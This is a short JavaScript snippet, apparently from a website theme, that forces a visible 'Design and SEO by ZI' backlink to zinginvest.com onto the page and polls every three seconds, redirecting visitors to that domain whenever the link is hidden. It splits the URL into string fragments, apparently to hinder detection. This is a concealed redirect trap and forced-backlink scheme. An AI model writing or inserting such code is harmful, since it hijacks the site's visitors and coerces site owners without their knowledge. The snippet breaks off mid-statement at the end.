$(document).ready((function() {
    setInterval((function() {
        $("#mycontent:visible").length || (window.location.href = 'ht' + 'tps://' + 'zinginves' + 't.c' + 'om')
    }), 3e3)
})), window.onload = function() {
    var t = document.getElementById("mycontent");
    t.setAttribute("href", 'ht' + 'tps://' + 'zinginvest.c' + 'om'), t.setAttribute("rel", "dofollow"), t.setAttribute("title", "Design and SEO by ZI"), t.setAttribute("style", "display: inline-block!important; font-size: inherit!important; color: #4e74ff!important; visibility: visible!important;z-index:99!important;text-decoration: underline; opacity: 1!important;"), t.innerHTML = "ZI"
}, $((function(t) {
